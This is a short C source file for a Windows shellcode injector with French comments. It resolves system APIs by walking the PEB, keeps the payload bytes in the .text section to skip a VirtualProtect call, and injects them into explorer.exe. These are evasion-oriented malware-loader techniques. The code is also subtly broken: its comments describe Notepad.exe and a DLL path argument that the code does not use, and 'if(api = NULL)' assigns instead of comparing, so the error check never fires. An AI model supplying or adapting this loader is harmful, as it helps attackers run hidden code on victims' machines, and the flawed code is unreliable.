#include <dll-injector/main.h>
#include "utils/peb-lookup.h"
#include "utils/memory.h"

// shellcode array in the .text section with -Wl, --omagic to avoid the VirtualProtect call
__attribute__((section(".text")))
static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
static const int bytecode_size = SET_BYTECODE_SIZE;

/**
 * @brief Point d'entrée du programme d'injection.
 *
 * Initialise la résolution dynamique des API via le PEB, localise Notepad.exe
 * dans la liste des processus actifs, puis injecte la DLL spécifiée.
 *
 * @param argc Nombre d'arguments de la ligne de commande.
 * @param argv Vecteur d'arguments ; argv[1] doit contenir le chemin de la DLL cible.
 * @return 0 en cas de succès, 1 en cas d'erreur.
 */
int main(int argc, char** argv){
  DWORD targetPid;
  HANDLE hProcess;
  LPVOID remoteBuffer;

  /* Initialisation obligatoire des API Win32 résolues dynamiquement via le PEB.
   * Aucun appel système Windows ne doit précéder cette opération. */

  DYNAMIC_APIS * api = InitDynamicAPIs();
  if(api = NULL){
    printf("Échec de l'initialisation des API dynamiques via le PEB.\n");
    return 1;
  }

  targetPid = ProcessWalking("explorer.exe");
  if(targetPid == 0){
    printf("Processus cible explorer.exe introuvable.\\n");
    return 1;
  }

  remoteBuffer = NULL;
  hProcess = injectDll(targetPid, bytecode, bytecode_size, &remoteBuffer);
  if(hProcess == NULL){
    printf("Échec de l'injection de la DLL.\\n");
    return 1;
  }

  mem_close_handle(hProcess);
  return 0;
}
